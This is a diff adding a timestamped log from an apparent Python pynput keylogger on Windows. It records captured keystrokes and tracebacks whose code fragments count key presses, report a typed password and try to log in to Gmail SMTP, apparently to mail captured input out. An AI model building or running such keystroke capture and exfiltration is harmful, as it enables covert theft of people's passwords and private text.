+2019-07-27 11:50:40,042: Infomation: Key.left
+2019-07-27 11:50:40,065: Infomation: Key.left
+2019-07-27 11:50:40,089: Infomation: Key.left
+2019-07-27 11:50:40,114: Infomation: Key.left
+2019-07-27 11:50:40,138: Infomation: Key.left
+2019-07-27 11:50:40,161: Infomation: Key.left
+2019-07-27 11:50:40,185: Infomation: Key.left
+2019-07-27 11:50:40,209: Infomation: Key.left
+2019-07-27 11:50:40,233: Infomation: Key.left
+2019-07-27 11:50:40,365: Infomation: Key.right
+2019-07-27 11:50:40,534: Infomation: Key.right
+2019-07-27 11:50:40,679: Infomation: Key.right
+2019-07-27 11:50:40,847: Infomation: Key.right
+2019-07-27 11:50:41,006: Infomation: Key.right
+2019-07-27 11:50:41,187: Infomation: Key.right
+2019-07-27 11:50:41,592: Infomation: Key.backspace
+2019-07-27 11:50:41,755: Infomation: Key.backspace
+2019-07-27 11:50:41,909: Infomation: Key.backspace
+2019-07-27 11:50:42,059: Infomation: Key.backspace
+2019-07-27 11:50:42,211: Infomation: Key.backspace
+2019-07-27 11:50:42,352: Infomation: Key.backspace
+2019-07-27 11:50:42,553: Infomation: Key.shift
+2019-07-27 11:50:42,915: Infomation: 'p'
+2019-07-27 11:50:43,097: Infomation: 'a'
+2019-07-27 11:50:43,336: Infomation: 's'
+2019-07-27 11:55:48,355: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 34, in on_press
+    Num_key += Num_key
+UnboundLocalError: local variable 'Num_key' referenced before assignment
+2019-07-27 11:56:33,395: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 34, in on_press
+    Num_key += 1
+UnboundLocalError: local variable 'Num_key' referenced before assignment
+2019-07-27 11:59:33,146: Infomation: 's'
+2019-07-27 11:59:41,431: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 54, in on_press
+    print("Passsword typed: *** and number of string: {1}".format(len(password)))
+IndexError: tuple index out of range
+2019-07-27 12:00:35,568: Infomation: 'j'
+2019-07-27 12:00:35,704: Infomation: 'k'
+2019-07-27 12:00:35,827: Infomation: 'j'
+2019-07-27 12:00:35,850: Infomation: 'a'
+2019-07-27 12:00:35,965: Infomation: 'k'
+2019-07-27 12:00:35,979: Infomation: 'l'
+2019-07-27 12:00:36,047: Infomation: 'd'
+2019-07-27 12:00:36,669: Infomation: 's'
+2019-07-27 12:01:00,889: Infomation: 'e'
+2019-07-27 12:01:07,293: Infomation: 's'
+2019-07-27 12:01:24,459: Infomation: 'e'
+2019-07-28 10:29:43,600: Infomation: 'h'
+2019-07-28 10:29:43,803: Infomation: 'u'
+2019-07-28 10:29:44,006: Infomation: 'n'
+2019-07-28 10:29:44,126: Infomation: 'g'
+2019-07-28 10:29:44,963: Infomation: 's'
+2019-07-28 10:30:09,122: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 157, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\keyboard\_win32.py", line 240, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
+    if f(*args) is False:
+  File "Log_file_to_determine_position.py", line 56, in on_press
+    server.login(sender_email, password)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 730, in login
+    raise last_exception
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\smtplib.py", line 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials s5sm36136138pfm.97 - gsmtp')
